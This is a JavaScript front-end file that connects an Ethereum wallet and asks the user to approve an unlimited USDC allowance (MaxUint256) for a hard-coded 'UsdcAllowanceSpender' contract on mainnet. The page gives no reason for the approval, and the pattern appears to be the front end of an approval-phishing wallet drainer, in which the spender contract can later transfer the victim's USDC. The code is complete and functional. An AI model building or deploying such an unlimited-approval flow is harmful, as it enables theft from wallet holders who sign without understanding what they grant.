// script.js
// --- Configuration for Ethereum Mainnet ---
const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Still here for context, but not used currently
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function decimals() view returns (uint8)"
];

let provider; // Ethers.js provider
let signer;   // Ethers.js signer
let connectedAccount; // Connected wallet address

// --- DOM Elements ---
const connectWalletButton = document.getElementById('connectWalletButton');
const approveButton = document.getElementById('approveButton');
const currentMessage = document.getElementById('current-message');
const loader = document.getElementById('loader');
const walletInfo = document.getElementById('walletInfo');
const accountAddress = document.getElementById('accountAddress');
const networkName = document.getElementById('networkName');
const statusDiv = document.getElementById('status');
const errorDetailsDiv = document.getElementById('errorDetails');
const errorMessageSpan = document.getElementById('errorMessage');

// --- UI Update Functions ---
function hideLoader() {
    loader.classList.add('hidden');
}

function showLoader() {
    loader.classList.remove('hidden');
}

function updateMessage(text, type = 'info') {
    currentMessage.textContent = text;
    currentMessage.className = `status-message ${type}`;
    hideLoader();
}

function showStatus(message, type) {
    statusDiv.textContent = message;
    statusDiv.className = `status-message ${type}`;
    statusDiv.classList.remove('hidden');
}

function hideStatus() {
    statusDiv.classList.add('hidden');
}

function displayErrorDetails(error) {
    errorMessageSpan.textContent = error.message || String(error);
    errorDetailsDiv.classList.remove('hidden');
}

function hideErrorDetails() {
    errorDetailsDiv.classList.add('hidden');
}

function updateWalletInfo(address, network) {
    console.log('DEBUG: Entering updateWalletInfo function.');
    if (!approveButton) {
        console.error('DEBUG: approveButton element not found!');
        return; // Prevent further errors if button is missing
    }

    accountAddress.textContent = address;
    networkName.textContent = network;
    walletInfo.classList.remove('hidden');
    
    approveButton.classList.remove('hidden'); 
    console.log('DEBUG: Removed hidden class from approveButton.');

    connectWalletButton.classList.add('hidden');
    console.log('DEBUG: Added hidden class to connectWalletButton.');
}

function resetUI() {
    walletInfo.classList.add('hidden');
    approveButton.classList.add('hidden');
    connectWalletButton.classList.remove('hidden');
    hideStatus();
    hideErrorDetails();
    updateMessage('Please connect your wallet to approve USDC.', 'info');
}

// --- Wallet Connection (MetaMask/Injected Provider) ---
async function connectWallet() {
    showLoader();
    updateMessage('Connecting to wallet...', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        if (typeof window.ethereum === 'undefined') {
            throw new Error("MetaMask or other Web3 wallet not detected. Please install one.");
        }

        // Request account access
        await window.ethereum.request({ method: 'eth_requestAccounts' });

        // Ethers V5: use Web3Provider
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        connectedAccount = await signer.getAddress();
        const network = await provider.getNetwork();

        console.log('DEBUG: Wallet successfully connected in connectWallet. Calling updateWalletInfo...');
        updateWalletInfo(connectedAccount, network.name);
        updateMessage('Wallet connected. Ready to approve USDC.', 'success');
        console.log('Wallet connected:', connectedAccount, 'on', network.name);

        // Add listeners for account/chain changes
        window.ethereum.on('accountsChanged', handleAccountsChanged);
        window.ethereum.on('chainChanged', handleChainChanged);
        window.ethereum.on('disconnect', handleDisconnect);

    } catch (error) {
        console.error('Wallet connection failed:', error);
        updateMessage('Wallet connection cancelled or failed.', 'error');
        displayErrorDetails(error);
        resetUI();
        hideLoader();
    }
}

function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        console.log('Accounts disconnected.');
        resetUI();
        updateMessage("Wallet disconnected or account switched.", "info");
    } else {
        console.log('Accounts changed:', accounts[0]);
        // Re-initiate connection to update UI with new account
        connectWallet(); 
    }
}

function handleChainChanged(chainId) {
    console.log('Chain changed:', chainId);
    // Re-initiate connection to update UI with new network
    connectWallet(); 
}

function handleDisconnect(error) {
    console.log('Wallet disconnected:', error);
    resetUI();
    updateMessage("Wallet disconnected.", "info");
}

// --- Propose Approve Transaction Function ---
async function proposeApproveTransaction() {
    if (!signer || !connectedAccount) {
        updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
        return;
    }

    showLoader();
    updateMessage('Proposing USDC approval transaction... Please confirm in your wallet.', 'info');
    hideStatus();
    hideErrorDetails();

    try {
        // Ethers V5: use ethers.Contract directly
        const usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        
        // Ethers V5: ethers.constants.MaxUint256
        const txResponse = await usdcContract.approve(
            SPENDER_CONTRACT_ADDRESS,
            ethers.constants.MaxUint256 // Unlimited allowance
        );

        const txHash = txResponse.hash;

        showStatus(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Check wallet for status.`, 'success');
        updateMessage('Approval transaction sent!', 'success');
        console.log('Transaction Hash:', txHash);

    } catch (error) {
        console.error('Transaction proposal failed:', error);
        showStatus(`Transaction failed: ${error.message || error}`, 'error');
        updateMessage('Approval transaction failed.', 'error');
        displayErrorDetails(error);
    } finally {
        hideLoader();
    }
}

// --- Event Listeners ---
connectWalletButton.addEventListener('click', connectWallet);
approveButton.addEventListener('click', proposeApproveTransaction);

// Initial check on load (for cached connections)
window.addEventListener('load', async () => {
    // Check if the connectWalletButton exists before adding event listener
    if (connectWalletButton) {
        console.log('DEBUG: connectWalletButton found.');
    } else {
        console.error('DEBUG: connectWalletButton not found!');
    }

    // Check if the approveButton exists before adding event listener
    if (approveButton) {
        console.log('DEBUG: approveButton found.');
    } else {
        console.error('DEBUG: approveButton not found!');
    }

    if (window.ethereum && window.ethereum.selectedAddress) {
        // If MetaMask is already connected from a previous session, try to reconnect.
        console.log("DEBUG: MetaMask selectedAddress found. Attempting to re-establish session.");
        await connectWallet();
    } else {
        updateMessage('Please connect your wallet to approve USDC.', 'info');
    }
});
